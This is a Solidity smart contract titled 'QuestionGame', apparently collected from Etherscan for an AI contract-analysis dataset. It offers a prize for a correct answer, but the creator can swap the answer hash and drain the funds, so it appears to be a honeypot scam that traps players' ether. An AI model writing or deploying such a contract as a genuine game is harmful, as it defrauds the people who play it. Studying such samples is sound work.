/**********************************************************************
*These solidity codes have been obtained from Etherscan for extracting
*the smartcontract related info.
*The data will be used by MATRIX AI team as the reference basis for
*MATRIX model analysis,extraction of contract semantics,
*as well as AI based data analysis, etc.
**********************************************************************/
pragma solidity ^0.4.17;

contract QuestionGame
{
    string public question;
    address questionSender;
    bytes32 responseHash;
 
    function Answer(string _response) public payable {
        if (responseHash == keccak256(_response) && msg.value>1 ether) {
            msg.sender.transfer(this.balance);
        }
    }
 
    function StartGame(string _question,string _response) public payable {
        if (responseHash==0x0) {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }

    function StopGame() public payable {
        if (msg.sender==questionSender) {
            msg.sender.transfer(this.balance);
        }
    }

    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if (msg.sender==questionSender) {
            question = _question;
            responseHash = _responseHash;
        }
    }

    function () public payable { }
}